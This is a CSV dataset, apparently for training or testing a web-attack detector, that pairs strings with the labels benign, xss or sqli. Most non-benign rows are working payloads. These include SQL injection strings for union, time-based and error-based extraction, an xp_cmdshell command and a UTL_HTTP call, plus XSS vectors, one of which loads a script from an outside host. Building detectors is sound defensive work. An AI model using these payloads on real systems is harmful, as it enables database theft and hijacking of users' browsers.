payload,type
53424203x,benign
20491,benign
<svg><footer onload=alert(1)></footer>,xss
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",sqli
34855320q,benign
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,sqli
verney,benign
6.30E+15,benign
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,xss
<username>' OR 1=1--,sqli
4.42E+15,benign
"<style>@keyframes x{}</style><ol style=""animation-name:x"" onanimationend=""alert(1)""></ol>",xss
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,sqli
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",sqli
carretera 200 hasta km. 1 barra de mio 175,benign
kallewar,benign
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>,xss
"1""  )   where 3507  =  3507",sqli
<form onsubmit=alert(1)><input type=submit>,xss
orea,benign
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",sqli
mcbrayne,benign
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,sqli
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>,xss
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,xss
reconfortante,benign
"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",xss
<body onfocusout=alert(1) id=x><iframe id=x>,xss
ren,benign
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",xss
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",sqli
"<blockquote onmouseenter=""alert(1)"">test</blockquote>",xss
.bronceada,benign
"<tfoot onclick=""alert(1)"">test</tfoot>",xss
""" or benchmark  (  10000000,MD5  (  1   )    )   #",sqli
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,xss
rains8,benign
teo,benign
6o40o41,benign
pittner,benign
<svg><html onload=alert(1)></html>,xss
"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",sqli
"-7469  )   where 5875  =  5875 or make_set  (  9354  =  9354,7185  )  --",sqli
"<slot onkeypress=""alert(1)"" contenteditable>test</slot>",xss
99997973e,benign
8.62E+15,benign
aran1el1ria,benign
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",sqli
9667,benign
"<dt onmousemove=""alert(1)"">test</dt>",xss
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",sqli
"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",sqli
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'qgov'  =  'qgov",sqli
2.39E+15,benign
"<canvas onmousemove=""alert(1)"">test</canvas>",xss
5.66E+15,benign
"<dialog onpaste=""alert(1)"" contenteditable>test</dialog>",xss
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sqli
"<dd oncopy=""alert(1)"" contenteditable>test</dd>",xss
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,sqli
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",xss
"<html oncontextmenu=""alert(1)"">test</html>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></progress>",xss
l1b6855ca30e,benign
"calle de circulacio de l' oest, 7",benign
"1   )    )     )   union all select null,null,null,null,null--",sqli
"1""  )   where 9861  =  9861",sqli
 WHERE 1=1 AND 1=0--,sqli
"1""  )  ",sqli
1'   )    )    as ypgz where 8704  =  8704,sqli
"calle antequeruela, 94, 7-a",benign
<rt id=x tabindex=1 onfocusin=alert(1)></rt>,xss
parra,benign
"<style>:target {color: red;}</style><header id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></header>",xss
1272,benign
"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",sqli
solana de los barros,benign
agujer4e2o,benign
1'+  (  select eluw where 6210  =  6210,sqli
pagni7@freecreditcheck.bg,benign
"-8026 or elt  (  8434  =  4516,4516  )  # bsqo",sqli
"1'   )    )     )   and elt  (  9501  =  8427,8427  )   and    (    (     (  'ahpp'  =  'ahpp",sqli
"<rb onpaste=""alert(1)"" contenteditable>test</rb>",xss
"<hr onmouseenter=""alert(1)"">test</hr>",xss
"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>",xss
"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli
"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",sqli
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sqli
||UTL_HTTP.REQUEST,sqli
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",sqli
 AND 1=0#,sqli
"-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  '",sqli
"1%""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>",xss
guillen,benign
"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gucd'  =  'gucd",sqli
"""autofocus/onfocus=alert(1)//",xss
81e9604o6o,benign
"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",sqli
"<q onmouseover=""alert(1)"">test</q>",xss
"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",sqli
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cgbf' like 'cgbf",sqli
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",xss
"<image onmousemove=""alert(1)"">test</image>",xss
"<scRiPt y=""><"">/*<sCRipt* */prompt()</script",xss
perr@pasajesaereosbaratos.pm,benign
37793,benign
"<header ondblclick=""alert(1)"">test</header>",xss
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss
nuez de balboa 131 2-f,benign
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></multicol>",xss
18708,benign
"<style>:target {transform: rotate(180deg);}</style><embed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></embed>",xss
"<div draggable=""true"" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>",xss
san lorenzo de la parrilla,benign
"<img ondblclick=""alert(1)"">test</img>",xss
"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",xss
"<pre onpaste=""alert(1)"" contenteditable>test</pre>",xss
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,sqli
"<style>:target {color:red;}</style><col id=x style=""transition:color 1s"" ontransitionend=alert(1)></col>",xss
"<var onclick=""alert(1)"">test</var>",xss
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
47209,benign
"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",sqli
armelle,benign
"plza. salamanca 39,",benign
" ORDER BY 1,SLEEP(5)-- ",sqli
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",sqli
"<command onclick=""alert(1)"">test</command>",xss
"<figure draggable=""true"" ondragenter=""alert(1)"">test</figure>",xss
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,sqli
"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",sqli
23522946h,benign
urea bernat,benign
1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',sqli
tacoronte,benign
"<col onclick=""alert(1)"">test</col>",xss
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",sqli
"<iframe oncut=""alert(1)"" contenteditable>test</iframe>",xss
<script src=//brutelogic.com.br/1.js> ,xss
"1%""   )    )    union all select null,null#",sqli
"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",sqli
42210,benign
"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
"<colgroup onmouseup=""alert(1)"">test</colgroup>",xss
"<section draggable=""true"" ondrag=""alert(1)"">test</section>",xss
"<colgroup onmouseout=""alert(1)"">test</colgroup>",xss
 or '1'='1'--,sqli
"<applet onmouseout=""alert(1)"">test</applet>",xss
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>",xss
aguilar de bureba,benign
"1%"" rlike sleep  (  5  )   and ""%""  =  """,sqli
"1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",sqli
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",xss
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationend=""alert(1)""></tr>",xss
<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>,xss
select   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  select 8808 from master..sysdatabases  )   end  )  --,sqli
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",xss
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",xss
777t1c4rio,benign
select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></small>",xss
if  (  3831  =  9321  )   select 3831 else drop function ybru--,sqli
"<style onkeydown=""alert(1)"" contenteditable>test</style>",xss
truncate,sqli
"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",xss
47185,benign
"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",xss
"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",sqli
"<aside onmouseleave=""alert(1)"">test</aside>",xss
-9148  )   where 2027  =  2027 or 8571  =  8571--,sqli
" select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",sqli
1'  )   where 9272  =  9272,sqli
"<del onkeydown=""alert(1)"" contenteditable>test</del>",xss
exec sp,sqli
"<dl onbeforecopy=""alert(1)"" contenteditable>test</dl>",xss
6.55E+15,benign
19223,benign
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>",xss
"calle doctor bove, 65",benign
1.19E+15,benign
1  )   as qkkm where 8461  =  8461,sqli
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",xss
"<button onkeydown=""alert(1)"" contenteditable>test</button>",xss
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",xss
"<animation xlink:href=""data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",xss
"<style>:target {transform: rotate(180deg);}</style><hgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hgroup>",xss
"<blockquote onmouseleave=""alert(1)"">test</blockquote>",xss
"<div onmouseenter=""alert(1)"">test</div>",xss
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",sqli
exec master..xp_cmdshell 'net+view',sqli
eial,benign
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>",xss
"c/ concepcion alexandre 82,",benign
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",sqli
"<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bgsound>",xss
decuplar,benign
villafranca del bierzo,benign
 or 1=1,sqli
"1""   )    )     )   union all select null,null,null,null,null,null,null,null#",sqli
"1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
"<ruby oncut=""alert(1)"" contenteditable>test</ruby>",xss
corulln,benign
"<div id=""134""><xmp>",xss
6769,benign
"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",xss
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",xss
<br>,xss
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,xss
"<bdi draggable=""true"" ondragend=""alert(1)"">test</bdi>",xss
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",xss
"1""   )    )    as iubt where 8179  =  8179 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
ransell,benign
"cruz nueva, s/n 5-c",benign
<svg><rb onload=alert(1)></rb>,xss
"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",xss
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#",sqli
9e1an906,benign
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,sqli
<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>,xss
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",xss
43470,benign
<iframe onload=alert(1)></iframe>,xss
<ins id=x tabindex=1 onfocus=alert(1)></ins>,xss
1'||  (  select 'fwph' where 3791  =  3791,sqli
select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,sqli
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",sqli
46841,benign
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",xss
"<form onmousemove=""alert(1)"">test</form>",xss
<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>,xss
"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",xss
neusy,benign
bolkan@directoriogratuito.int,benign
berleand@campanasextractoras.la,benign
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",sqli
